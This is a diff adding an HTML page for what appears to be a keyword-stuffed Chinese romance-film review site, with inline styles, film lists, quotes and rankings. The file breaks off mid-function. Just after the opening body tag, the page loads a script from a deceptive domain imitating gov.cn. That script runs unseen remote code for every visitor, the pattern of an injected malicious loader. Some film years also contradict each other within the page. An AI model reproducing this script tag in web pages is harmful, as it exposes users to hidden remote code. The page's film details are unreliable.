@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="爱情电影网撸丝片，专注爱情电影赏析与片单推荐：初恋、暗恋、异地、失恋、重逢与婚姻。提供高分爱情片单、经典台词、类型分类与正版观影渠道指引。">
+<meta name="keywords" content="爱情电影网撸丝片, 爱情电影, 经典爱情片, 高分爱情电影, 浪漫电影, 失恋电影, 爱情片单, 电影赏析">
+<meta name="author" content="爱情电影网撸丝片">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>爱情电影网撸丝片 - 爱情电影赏析 · 高分片单 · 经典台词与类型解读</title>
+<style>
+/* ==========================================================
+   爱情电影网撸丝片  单页响应式网站
+   视觉基调：樱粉 + 胭脂红 + 珍珠白（浪漫 / 胶片感）
+   6 套差异化 DOM 模板，CSS/JS 全部内联，标签闭合
+   ========================================================== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --paper:#fdf7f6;
+  --paper2:#f8ecea;
+  --ink:#2b1d22;
+  --ink2:#4c3740;
+  --dim:#9a8089;
+  --mute:#c1adb4;
+  --rose:#d64b7a;      /* 胭脂 */
+  --rose2:#b53661;
+  --wine:#8c2f4a;      /* 酒红 */
+  --plum:#6d3b5c;
+  --line:rgba(140,47,74,.13);
+  --line2:rgba(140,47,74,.28);
+  --mx:1180px;
+  --r:22px;
+  --grad:linear-gradient(120deg,var(--rose),var(--wine));
+  --serif:"Songti SC","STSong","SimSun","Noto Serif SC",Georgia,serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased;
+  background-image:
+    radial-gradient(680px 320px at 90% 4%,rgba(214,75,122,.10),transparent 60%),
+    radial-gradient(600px 300px at 6% 96%,rgba(140,47,74,.08),transparent 62%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;transition:.26s}
+img,svg{max-width:100%;display:block}
+ul{list-style:none}
+button{font-family:inherit}
+::selection{background:var(--rose);color:#fff}
+
+.wrap{max-width:var(--mx);margin:0 auto;padding:0 26px}
+section{padding:84px 0;position:relative}
+.eyebrow{font-size:11px;letter-spacing:4px;color:var(--rose2);font-weight:800;text-transform:uppercase;font-family:var(--serif)}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;flex-wrap:wrap;margin-bottom:38px;padding-bottom:12px}
+.sec-t{font-family:var(--serif);font-size:30px;font-weight:950;letter-spacing:1px;line-height:1.25}
+.sec-t small{display:block;font-family:inherit;font-size:12px;color:var(--dim);font-weight:600;letter-spacing:3px;margin-top:7px}
+.more{font-size:13px;font-weight:800;color:var(--ink2);border-bottom:2px solid var(--rose);padding-bottom:2px}
+.more:hover{color:var(--rose)}
+
+/* ---------- Header ---------- */
+.hd{position:sticky;top:0;z-index:100;background:rgba(253,247,246,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:74px;gap:20px}
+.logo{display:flex;align-items:center;gap:10px;font-family:var(--serif);font-weight:950;font-size:25px;letter-spacing:1px;color:var(--ink)}
+.logo .mk{display:inline-grid;place-items:center;width:36px;height:36px;border-radius:50%;background:var(--grad);color:#fff;font-size:18px;font-weight:950;box-shadow:0 8px 18px rgba(214,75,122,.34)}
+.logo em{font-style:normal;color:var(--rose2);font-size:14px;font-weight:700;letter-spacing:2px;font-family:inherit}
+.nav{display:flex;gap:2px}
+.nav a{font-size:14px;padding:9px 15px;border-radius:12px;color:var(--ink2);font-weight:650}
+.nav a:hover{background:rgba(214,75,122,.12);color:var(--rose2)}
+.nav a.on{color:#fff;background:var(--grad);font-weight:800}
+.mbtn{display:none;width:46px;height:46px;border:1px solid var(--line2);border-radius:12px;background:var(--paper2);color:var(--ink);font-size:20px;cursor:pointer}
+
+/* ---------- Hero ---------- */
+.hero{padding:72px 0 30px}
+.hero .wrap{display:grid;grid-template-columns:1fr .92fr;gap:56px;align-items:center}
+.hero h1{font-family:var(--serif);font-size:clamp(38px,6vw,64px);line-height:1.14;font-weight:950;letter-spacing:-.6px;margin:12px 0 22px}
+.hero h1 i{font-style:normal;color:var(--rose2);position:relative;display:inline-block}
+.hero h1 i::after{content:"";position:absolute;left:0;right:0;bottom:6px;height:10px;background:rgba(214,75,122,.2);z-index:-1}
+.hero .lede{font-size:16.5px;color:var(--ink2);max-width:540px;margin-bottom:26px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:16px;overflow:hidden;margin-bottom:26px}
+.stat{background:var(--paper);padding:18px 12px;text-align:center}
+.stat b{display:block;font-family:var(--serif);font-size:27px;font-weight:950;color:var(--rose2)}
+.stat span{font-size:11px;color:var(--dim);letter-spacing:1px}
+.acts{display:flex;gap:14px;flex-wrap:wrap}
+.b{padding:14px 32px;border-radius:34px;font-size:15px;font-weight:850;cursor:pointer;border:0;transition:.26s;letter-spacing:.5px}
+.b-p{background:var(--grad);color:#fff;box-shadow:0 12px 28px rgba(214,75,122,.34)}
+.b-p:hover{transform:translateY(-2px)}
+.b-g{border:2px solid var(--ink);color:var(--ink);background:transparent}
+.b-g:hover{background:var(--ink);color:var(--paper)}
+.kw{display:flex;gap:9px;flex-wrap:wrap;margin-top:26px}
+.kw a{font-size:12px;color:var(--ink2);border:1px solid var(--line2);background:var(--paper2);padding:6px 14px;border-radius:22px}
+.kw a:hover{color:#fff;border-color:transparent;background:var(--grad);transform:translateY(-2px)}
+
+/* 胶片条卡 */
+.reel{border-radius:26px;overflow:hidden;background:#fff;border:1px solid var(--line);box-shadow:0 30px 70px rgba(43,29,34,.18);transform:rotate(-1.4deg)}
+.reel .film{display:flex;gap:10px;padding:16px;background:#24181c;overflow-x:auto;scrollbar-width:thin}
+.reel .film::-webkit-scrollbar{height:8px}
+.reel .film::-webkit-scrollbar-thumb{background:var(--rose);border-radius:8px}
+.reel .film .fr{flex:0 0 118px;height:150px;border-radius:10px;display:grid;place-items:center;font-family:var(--serif);font-size:22px;font-weight:950;color:#fff;position:relative}
+.reel .film .fr small{position:absolute;left:8px;bottom:8px;font-size:10px;letter-spacing:1px;color:#ffd9e2}
+.reel .cap{padding:18px 22px;background:linear-gradient(160deg,#fff,#fbeef1)}
+.reel .cap h3{font-family:var(--serif);font-size:20px;font-weight:950;color:var(--wine)}
+.reel .cap p{font-size:13px;color:var(--ink2);margin-top:5px}
+
+/* ---------- Search ---------- */
+.sbar{margin-top:-46px;position:relative;z-index:6}
+.sin{display:flex;gap:0;background:#fff;border:2px solid var(--ink);border-radius:16px;overflow:hidden;box-shadow:0 18px 40px rgba(43,29,34,.16)}
+.sin:focus-within{border-color:var(--rose);box-shadow:0 0 0 5px rgba(214,75,122,.16)}
+.sin input{flex:1;background:transparent;border:0;color:var(--ink);font-size:15px;padding:14px 18px;outline:none;min-width:0}
+.sin input::placeholder{color:var(--mute)}
+.sin button{border:0;background:var(--ink);color:var(--paper);font-weight:850;padding:13px 36px;cursor:pointer;font-size:15px;letter-spacing:2px;transition:.26s}
+.sin button:hover{background:var(--grad)}
+
+/* ============ 栏目一：电影 —— 横向滑动时间轴卡 ============ */
+.ts{display:flex;gap:20px;overflow-x:auto;padding:6px 2px 18px;scroll-snap-type:x mandatory;scrollbar-width:thin}
+.ts::-webkit-scrollbar{height:10px}
+.ts::-webkit-scrollbar-thumb{background:linear-gradient(90deg,var(--rose),var(--wine));border-radius:10px}
+.ts .flm{flex:0 0 clamp(250px,26vw,296px);scroll-snap-align:start;border-radius:var(--r);overflow:hidden;background:#fff;border:1px solid var(--line);transition:.34s;cursor:pointer}
+.ts .flm:hover{transform:translateY(-9px) rotate(.6deg);box-shadow:0 26px 50px rgba(43,29,34,.2);border-color:var(--rose)}
+.ts .flm .cv{aspect-ratio:16/10;display:grid;place-items:center;font-family:var(--serif);font-size:40px;font-weight:950;color:#fff;position:relative}
+.ts .flm .cv .tg{position:absolute;top:12px;left:12px;background:#fff;color:var(--wine);font-size:10.5px;font-weight:850;letter-spacing:1px;padding:5px 11px;border-radius:20px}
+.ts .flm .cv .sc{position:absolute;right:12px;bottom:12px;background:rgba(0,0,0,.42);color:#fff;font-size:11px;padding:4px 10px;border-radius:20px;backdrop-filter:blur(4px)}
+.ts .flm .bd{padding:15px 17px 17px}
+.ts .flm .bd h4{font-size:16.5px;font-weight:850;margin-bottom:4px;font-family:var(--serif)}
+.ts .flm .bd small{font-size:11.5px;color:var(--dim)}
+
+/* ============ 栏目二：类型 —— 甜甜圈环形进度蜂窝 ============ */
+.hiv{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:20px;justify-items:center}
+.hc{width:150px;text-align:center;cursor:pointer;transition:.3s}
+.hc:hover{transform:translateY(-7px)}
+.hc .ring{width:118px;height:118px;margin:0 auto 12px;border-radius:50%;display:grid;place-items:center;font-family:var(--serif);font-size:26px;font-weight:950;color:var(--wine);box-shadow:0 12px 26px rgba(43,29,34,.14)}
+.hc h4{font-size:15px;font-weight:850}
+.hc small{font-size:11px;color:var(--dim)}
+
+/* ============ 栏目三：台词 —— 轮播式引用卡 ============ */
+.qs{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:22px}
+.qt{position:relative;border-radius:var(--r);padding:30px 26px 24px;background:
+  radial-gradient(220px 180px at 90% 8%,rgba(255,255,255,.5),transparent 55%),
+  var(--grad);color:#fff;transition:.32s;cursor:pointer;overflow:hidden}
+.qt:hover{transform:translateY(-7px) scale(1.01);box-shadow:0 24px 50px rgba(214,75,122,.34)}
+.qt .qm{font-family:var(--serif);font-size:74px;line-height:.6;position:absolute;right:16px;top:14px;color:rgba(255,255,255,.34)}
+.qt p{font-family:var(--serif);font-size:17px;line-height:1.7;position:relative;font-weight:600}
+.qt .who{margin-top:16px;font-size:12.5px;letter-spacing:1px;opacity:.92;border-top:1px solid rgba(255,255,255,.32);padding-top:11px}
+
+/* ============ 栏目四：片单 —— 数据表 ============ */
+.tbwrap{overflow-x:auto;border:1px solid var(--line);border-radius:16px;background:#fff}
+table{width:100%;border-collapse:collapse;min-width:640px;font-size:13.5px}
+thead th{background:var(--paper2);color:var(--wine);font-family:var(--serif);font-size:14px;text-align:left;padding:15px 16px;border-bottom:2px solid var(--line)}
+tbody td{padding:14px 16px;border-bottom:1px solid var(--line);color:var(--ink2);vertical-align:middle}
+tbody tr:hover{background:#fdeef3}
+tbody tr:last-child td{border-bottom:0}
+.rk{font-family:var(--serif);font-size:19px;font-weight:950;color:var(--rose)}
+.rk.r1{color:#d4a017}
+.rk.r2{color:#9aa0a6}
+.rk.r3{color:#cd7f32}
+.stars{color:var(--rose);letter-spacing:1px;font-size:12px}
+.pill{font-size:11px;color:var(--wine);background:#fbe4ec;border:1px solid var(--line);border-radius:20px;padding:4px 11px;white-space:nowrap}
+
+/* ============ 栏目五：影评 —— 杂志主次卡 ============ */
+.mag{display:grid;grid-template-columns:1.5fr 1fr;gap:22px}
+.mag .lead{grid-row:span 2;border-radius:var(--r);padding:26px;color:#fff;display:flex;flex-direction:column;justify-content:flex-end;min-height:360px;transition:.34s;cursor:pointer;position:relative;overflow:hidden}
+.mag .lead::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 35%,rgba(20,10,14,.82))}
+.mag .lead:hover{transform:translateY(-7px);box-shadow:0 28px 56px rgba(43,29,34,.26)}
+.mag .lead .in{position:relative;z-index:2}
+.mag .lead .cat{font-size:10.5px;letter-spacing:3px;font-weight:850;color:#ffd9e2}
+.mag .lead h3{font-family:var(--serif);font-size:27px;font-weight:950;line-height:1.35;margin:9px 0}
+.mag .lead p{font-size:13.5px;opacity:.94;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.mag .mn{display:grid;grid-template-columns:88px 1fr;gap:15px;align-items:center;border-radius:16px;padding:13px;border:1px solid var(--line);background:#fff;transition:.28s;cursor:pointer}
+.mag .mn:hover{border-color:var(--rose);box-shadow:0 14px 30px rgba(43,29,34,.13);transform:translateX(5px)}
+.mag .mn .th{width:76px;height:76px;border-radius:12px;display:grid;place-items:center;font-family:var(--serif);font-size:22px;font-weight:950;color:#fff}
+.mag .mn h4{font-size:15px;font-weight:850;font-family:var(--serif);line-height:1.4}
+.mag .mn small{font-size:11px;color:var(--dim)}
+
+/* ---------- CTA ---------- */
+.cta{text-align:center;padding:64px 28px;border-radius:30px;border:1px solid var(--line);background:
+  radial-gradient(600px 260px at 50% -30%,rgba(214,75,122,.16),transparent 60%),
+  linear-gradient(160deg,#fff,#fbe6ec);margin:20px 0 40px;box-shadow:0 26px 60px rgba(43,29,34,.14)}
+.cta h2{font-family:var(--serif);font-size:clamp(26px,4.2vw,42px);font-weight:950;margin-bottom:14px;color:var(--wine)}
+.cta p{color:var(--ink2);max-width:640px;margin:0 auto 26px;font-size:15px}
+
+/* ---------- Footer ---------- */
+.ftr{background:linear-gradient(160deg,#24181c,#3a222a);color:var(--dim);padding:62px 0 26px;margin-top:40px}
+.ftr .wrap{color:var(--dim)}
+.fg{display:grid;grid-template-columns:1.7fr repeat(3,1fr);gap:30px;margin-bottom:36px}
+.fb .logo{color:#fff}
+.fb .logo em{color:var(--rose)}
+.fb p{font-size:13px;margin-top:14px;max-width:320px;line-height:1.95;color:#c3adb4}
+.fc h5{font-size:15px;margin-bottom:14px;color:#fff;letter-spacing:1px;font-family:var(--serif)}
+.fc a{display:block;font-size:13px;padding:5px 0}
+.fc a:hover{color:var(--rose);transform:translateX(4px)}
+.fbttm{text-align:center;font-size:12px;border-top:1px solid rgba(255,255,255,.12);padding-top:22px;line-height:2}
+.fbttm a{color:#c1adb4}
+.fbttm a:hover{color:var(--rose)}
+
+.top{position:fixed;right:20px;bottom:24px;width:50px;height:50px;border-radius:50%;background:var(--grad);color:#fff;display:grid;place-items:center;font-size:19px;cursor:pointer;box-shadow:0 10px 24px rgba(214,75,122,.4);opacity:0;pointer-events:none;transition:.3s;z-index:99;border:0}
+.top.show{opacity:1;pointer-events:auto}
+
+@media(max-width:960px){.hero .wrap{grid-template-columns:1fr}}
+@media(max-width:680px){
+  section{padding:56px 0}
+  .wrap{padding:0 16px}
+  .mbtn{display:grid;place-items:center}
+  .nav{position:fixed;inset:74px 0 0 100%;flex-direction:column;background:rgba(253,247,246,.99);padding:22px;border-top:1px solid var(--line);transition:.35s;z-index:99}
+  .nav.open{inset:74px 0 0 0}
+  .nav a{font-size:16px;padding:15px;border-radius:12px;text-align:center}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .reel{transform:none}
+  .sec-t{font-size:24px}
+  .mag{grid-template-columns:1fr}
+  .mag .lead{grid-row:auto;min-height:240px}
+  .sin button{padding:13px 20px;font-size:14px}
+}
+@media print{.hd,.sbar,.top,.nav,.kw{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ================= HEADER ================= -->
+<header class="hd">
+  <div class="wrap hd-in">
+    <a class="logo" href="#top" aria-label="返回顶部"><span class="mk">爱</span>爱情电影网撸丝片<em>LOVE FILM</em></a>
+    <nav class="nav" id="nav" aria-label="主导航">
+      <a href="#home" class="on">首页</a>
+      <a href="#film">电影</a>
+      <a href="#genre">类型</a>
+      <a href="#quote">台词</a>
+      <a href="#rank">榜单</a>
+      <a href="#review">影评</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="mbtn" id="mb" aria-label="菜单" aria-expanded="false">☰</button>
+  </div>
+</header>
+
+<!-- ================= HERO ================= -->
+<section id="home" class="hero">
+  <div class="wrap">
+    <div>
+      <div class="eyebrow">Love Film · 爱情电影网撸丝片</div>
+      <h1>爱情电影网撸丝片<br>每一场心动<br>都值得<b><i>被记住</i></b></h1>
+      <p class="lede">爱情电影网撸丝片，专注<b>爱情电影</b>的赏析与片单推荐：初恋的心跳、暗恋的沉默、异地的时差、失恋的雨夜、重逢的黄昏，以及婚姻里那些没说出口的话。我们不搬运资源，只为你挑选值得流泪也值得微笑的那一部。</p>
+      <div class="stats">
+        <div class="stat"><b>1200+</b><span>爱情影片</span></div>
+        <div class="stat"><b>9</b><span>爱情类型</span></div>
+        <div class="stat"><b>365</b><span>经典台词</span></div>
+        <div class="stat"><b>每日</b><span>推荐更新</span></div>
+      </div>
+      <div class="acts">
+        <a class="b b-p" href="#film">开始选片</a>
+        <a class="b b-g" href="#rank">高分榜单</a>
+      </div>
+      <div class="kw">
+        <a href="#film">爱情电影网撸丝片</a>
+        <a href="#film">爱情电影</a>
+        <a href="#genre">浪漫爱情</a>
+        <a href="#film">经典爱情片</a>
+        <a href="#quote">经典台词</a>
+        <a href="#rank">高分片单</a>
+        <a href="#film">失恋电影</a>
+        <a href="#review">电影赏析</a>
+      </div>
+    </div>
+    <div class="reel" aria-hidden="false">
+      <div class="film">
+        <div class="fr" style="background:linear-gradient(150deg,#d64b7a,#8c2f4a)">泰<small>1997</small></div>
+        <div class="fr" style="background:linear-gradient(150deg,#c25a6a,#6d3b5c)">怦<small>2001</small></div>
+        <div class="fr" style="background:linear-gradient(150deg,#e08a5a,#a84a3a)">初<small>2019</small></div>
+        <div class="fr" style="background:linear-gradient(150deg,#7a5a8a,#4a2f5a)">她<small>2013</small></div>
+        <div class="fr" style="background:linear-gradient(150deg,#5a8a7a,#2f5a4a)">绿<small>1994</small></div>
+        <div class="fr" style="background:linear-gradient(150deg,#8a6a5a,#5a3226)">卡<small>2004</small></div>
+      </div>
+      <div class="cap">
+        <h3>本期胶片 · 六种心动</h3>
+        <p>从《泰坦尼克号》到《卡罗尔》，爱情电影网撸丝片带你重看那些年让我们相信爱的镜头。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= SEARCH ================= -->
+<div class="wrap sbar">
+  <div class="sin">
+    <input type="search" id="q" placeholder="搜索影片、台词或类型，例如：爱情电影网撸丝片 经典爱情片 高分片单" aria-label="搜索">
+    <button onclick="doSearch()">搜 索</button>
+  </div>
+</div>
+
+<!-- ================= 栏目一：电影（横向滑动时间轴卡） ================= -->
+<section id="film">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">电影 · 心动片单<small>FILMS / 横向滑动卡</small></h2>
+      <a class="more" href="#">全部影片 →</a>
+    </div>
+    <div class="ts" id="ts"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目二：类型（甜甜圈环形进度蜂窝） ================= -->
+<section id="genre" style="background:linear-gradient(180deg,transparent,rgba(214,75,122,.06))">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">类型 · 爱的形态<small>GENRES / 环形进度</small></h2>
+      <a class="more" href="#">查看全部 →</a>
+    </div>
+    <div class="hiv" id="hiv"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目三：台词（轮播式引用卡） ================= -->
+<section id="quote">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">台词 · 一句心动<small>QUOTES / 引用卡</small></h2>
+      <a class="more" href="#">台词大全 →</a>
+    </div>
+    <div class="qs" id="qs"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目四：榜单（数据表） ================= -->
+<section id="rank" style="background:linear-gradient(180deg,rgba(140,47,74,.05),transparent)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">榜单 · 爱情电影 TOP 10<small>RANKING / 数据表</small></h2>
+      <a class="more" href="#">完整榜单 →</a>
+    </div>
+    <div class="tbwrap">
+      <table>
+        <thead><tr><th style="width:64px">#</th><th>影片</th><th style="width:150px">类型</th><th style="width:96px">年份</th><th style="width:96px">评分</th></tr></thead>
+        <tbody id="tb"></tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 栏目五：影评（杂志主次卡） ================= -->
+<section id="review">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">影评 · 读片笔记<small>REVIEWS / 杂志栅格</small></h2>
+      <a class="more" href="#">全部影评 →</a>
+    </div>
+    <div class="mag" id="mag"></div>
+  </div>
+</section>
+
+<!-- ================= CTA ================= -->
+<section>
+  <div class="wrap">
+    <div class="cta">
+      <h2>爱情电影网撸丝片，为每一场心动留一个座位</h2>
+      <p>初恋、暗恋、异地、失恋、重逢、婚姻——爱情有千万种形状，银幕替我们说出了那些没能说出口的话。爱情电影网撸丝片只做两件事：帮你找到值得看的那一部，并陪你读懂它。</p>
+      <a class="b b-p" href="#film">开始选片</a>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 栏目六：关于（页脚多列） ================= -->
+<footer class="ftr" id="about">
+  <div class="wrap">
+    <div class="fg">
+      <div class="fb">
+        <a class="logo" href="#top"><span class="mk">爱</span>爱情电影网撸丝片<em>LOVE FILM</em></a>
+        <p>爱情电影网撸丝片，专注爱情电影的赏析与片单推荐：经典爱情片、浪漫喜剧、虐恋、异地、失恋与婚姻题材。提供高分片单、经典台词、类型分类与正版观影渠道指引，让好电影被看见。</p>
+      </div>
+      <div class="fc">
+        <h5>影片频道</h5>
+        <a href="#home">首页</a>
+        <a href="#film">电影</a>
+        <a href="#genre">类型</a>
+        <a href="#quote">台词</a>
+        <a href="#rank">榜单</a>
+        <a href="#review">影评</a>
+      </div>
+      <div class="fc">
+        <h5>爱情类型</h5>
+        <a href="#">初恋暗恋</a>
+        <a href="#">异地恋</a>
+        <a href="#">虐恋悲剧</a>
+        <a href="#">浪漫喜剧</a>
+        <a href="#">婚姻伦理</a>
+        <a href="#">老年爱情</a>
+      </div>
+      <div class="fc">
+        <h5>关于本站</h5>
+        <a href="#">网站简介</a>
+        <a href="#">正版声明</a>
+        <a href="#">投稿合作</a>
+        <a href="#">免责声明</a>
+        <a href="#">友情链接</a>
+      </div>
+    </div>
+    <div class="fbttm">
+      <p>© <span id="yr"></span> 爱情电影网撸丝片（aiqingdianyingwanglusipian-cn）保留所有权利。</p>
+      <p style="margin-top:8px">网站网址：<a href="https://aiqingdianyingwanglusipian-cn.github.io" rel="noopener">https://aiqingdianyingwanglusipian-cn.github.io</a> ｜ 本页为演示模板，内页链接均以 # 占位。</p>
+      <p style="margin-top:8px">温馨提示：请通过正规渠道观看正版影视内容，支持创作者，遵守当地法律法规。</p>
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="top" aria-label="返回顶部">↑</button>
+
+<script>
+/* ============ 数据 ============ */
+var FILMS=[
+  {t:"泰坦尼克号",g:"史诗 · 灾难爱情",y:"1997",bg:"linear-gradient(150deg,#7a9bb5,#2c4a5e)",sc:"3h14m"},
+  {t:"怦然心动",g:"初恋 · 青春",y:"2010",bg:"linear-gradient(150deg,#f0b46a,#c26a3a)",sc:"1h30m"},
+  {t:"初恋这件小事",g:"暗恋 · 成长",y:"2010",bg:"linear-gradient(150deg,#e08aa0,#a84a6a)",sc:"1h58m"},
+  {t:"她",g:"科幻 · 孤独",y:"2013",bg:"linear-gradient(150deg,#8a7aa0,#4a3a6a)",sc:"2h06m"},
+  {t:"绿皮书",g:"公路 · 温情",y:"2018",bg:"linear-gradient(150deg,#6a9a7a,#2f5a3a)",sc:"2h10m"},
+  {t:"卡萨布兰卡",g:"战争 · 经典",y:"1942",bg:"linear-gradient(150deg,#a08a6a,#5a4026)",sc:"1h42m"},
+  {t:"罗马假日",g:"浪漫 · 黑白",y:"1953",bg:"linear-gradient(150deg,#d9d2c4,#8a7a5a)",sc:"1h58m"},
+  {t:"情书",g:"纯爱 · 书信",y:"1995",bg:"linear-gradient(150deg,#dfe8ee,#7a94a8)",sc:"1h56m"},
+  {t:"爱在黎明破晓前",g:"对话 · 邂逅",y:"1995",bg:"linear-gradient(150deg,#c9a07a,#8a5a2a)",sc:"1h41m"},
+  {t:"这个杀手不太冷",g:"禁忌 · 守护",y:"1994",bg:"linear-gradient(150deg,#5a6a7a,#2a3440)",sc:"1h50m"}
+];
+var GENRES=[
+  {n:"初恋暗恋",c:"12",bg:"#d64b7a",t:"初"},
+  {n:"异地恋",c:"8",bg:"#c25a6a",t:"异"},
+  {n:"虐恋悲剧",c:"15",bg:"#8c2f4a",t:"虐"},
+  {n:"浪漫喜剧",c:"20",bg:"#e08a5a",t:"喜"},
+  {n:"婚姻伦理",c:"11",bg:"#6d3b5c",t:"婚"},
+  {n:"老年爱情",c:"6",bg:"#5a8a7a",t:"暮"},
+  {n:"同性之爱",c:"9",bg:"#7a5a8a",t:"同"},
+  {n:"失恋治愈",c:"10",bg:"#a84a3a",t:"愈"}
+];
+var QUOTES=[
+  {q:"你跳，我也跳。",w:"《泰坦尼克号》 Jack"},
+  {q:"斯人若彩虹，遇上方知有。",w:"《怦然心动》 Bryce"},
+  {q:"有些人浅薄，有些人金玉其外败絮其中，但总有一天，你会遇到一个绚丽的人，她让你觉得以前遇过的所有人都只是浮云。",w:"《怦然心动》"},
+  {q:"我爱你，不是因为你是谁，而是我在你面前可以是谁。",w:"《剪刀手爱德华》"},
+  {q:"如果记忆是一个罐头，我希望它永远都不会过期。",w:"《重庆森林》"},
+  {q:"我连一秒都没有拥有过你，却感觉已经失去你千万次。",w:"《情书》"},
+  {q:"也许我们注定要失去我们所爱的人，否则我们怎么知道他们对我们有多重要？",w:"《本杰明·巴顿奇事》"},
+  {q:"最深的爱，是放手让你去飞。",w:"《卧虎藏龙》 俞秀莲"},
+  {q:"不是每一段爱情，都要有一个完美的结局。",w:"爱情电影网撸丝片 · 读片笔记"}
+];
+var RANK=[
+  {t:"泰坦尼克号",g:"史诗爱情",y:"1997",s:9.4},
+  {t:"怦然心动",g:"初恋",y:"2010",s:9.1},
+  {t:"罗马假日",g:"浪漫经典",y:"1953",s:9.1},
+  {t:"情书",g:"纯爱",y:"1995",s:8.9},
+  {t:"爱在黎明破晓前",g:"邂逅",y:"1995",s:8.8},
+  {t:"这个杀手不太冷",g:"守护",y:"1994",s:9.4},
+  {t:"绿皮书",g:"温情",y:"2018",s:8.9},
+  {t:"她",g:"孤独",y:"2013",s:8.4},
+  {t:"卡萨布兰卡",g:"战争爱情",y:"1942",s:8.7},
+  {t:"初恋这件小事",g:"暗恋",y:"2010",s:8.3}
+];
+var REVIEWS=[
+  {lead:true,t:"为什么我们一遍又一遍看《泰坦尼克号》",bg:"linear-gradient(150deg,rgba(60,30,40,.35),rgba(20,10,14,.9)),linear-gradient(150deg,#7a9bb5,#2c4a5e)",cat:"封面专题",p:"它从来不只是沉船。它讲的是：一个人在最短暂的相遇里，被完整地看见、被彻底地改变，然后勇敢到愿意放手。三十年过去，这段爱情依然是人类对“值得”二字最盛大的想象。",th:null,n:null},
+  {lead:false,t:"《怦然心动》：初恋的胜负，从来不在表白",bg:"linear-gradient(150deg,#f0b46a,#c26a3a)",th:"怦",n:"用一棵树讲清楚喜欢与爱的区别",c:"读片"},
+  {lead:false,t:"《情书》：一封寄给逝者的信，回了信",bg:"linear-gradient(150deg,#dfe8ee,#7a94a8)",th:"书",n:"未说出口的喜欢，是最长久的暗恋",c:"纯爱"},
+  {lead:false,t:"《她》：爱上声音，算不算爱情",bg:"linear-gradient(150deg,#8a7aa0,#4a3a6a)",th:"她",n:"孤独时代，我们到底在爱谁",c:"科幻"},
+  {lead:false,t:"《爱在》三部曲：对话即浪漫",bg:"linear-gradient(150deg,#c9a07a,#8a5a2a)",th:"爱",n:"把一生谈成一场18小时的聊天",c:"台词"}
+];
+
+function esc(s){return String(s).replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function stars(s){var n=Math.round(s),h="";for(var i=0;i<5;i++)h+=(i<n?"★":"☆");return h+" "+s;}
+
+function renderFilms(){
+  var h="";
+  for(var i=0;i<FILMS.length;i++){
+    var f=FILMS[i];
+    h+='<article class="flm"><div class="cv" style="background:'+f.bg+'"><span class="tg">'+f.g.split(" · ")[0]+'</span><span class="sc">'+f.sc+'</span>'+f.t.charAt(0)+'</div><div class="bd"><h4>'+f.t+'</h4><small>'+f.g+' ｜ '+f.y+'</small></div></article>';
+  }
+  document.getElementById("ts").innerHTML=h;
+}
+function renderGenres(){
+  var h="";
+  for(var i=0;i<GENRES.length;i++){
+    var g=GENRES[i], pct=Math.round(g.c/20*100);
+    h+='<a class="hc" href="#"><div class="ring" style="background:conic-gradient('+g.bg+' '+pct+'%, #fff0f4 '+pct+'%)">'+g.t+'</div><h4>'+g.n+'</h4><small>'+g.c+' 部精选</small></a>';
+  }
+  document.getElementById("hiv").innerHTML=h;
+}
+function renderQuotes(){
+  var h="";
+  for(var i=0;i<QUOTES.length;i++){
+    var q=QUOTES[i];
+    h+='<blockquote class="qt"><span class="qm" aria-hidden="true">“</span><p>'+q.q+'</p><div class="who">—— '+q.w+'</div></blockquote>';
+  }
+  document.getElementById("qs").innerHTML=h;
+}
+function renderRank(){
+  var h="";
+  for(var i=0;i<RANK.length;i++){
+    var r=RANK[i], cls=(i===0?"r1":i===1?"r2":i===2?"r3":"");
+    h+='<tr><td><span class="rk '+cls+'">'+(i+1)+'</span></td><td><b>'+r.t+'</b></td><td><span class="pill">'+r.g+'</span></td><td>'+r.y+'</td><td class="stars">'+stars(r.s)+'</td></tr>';
+  }
+  document.getElementById("tb").innerHTML=h;
+}
+function renderReviews(){
+  var h="";
+  for(var i=0;i<REVIEWS.length;i++){
+    var m=REVIEWS[i];
+    if(m.lead){
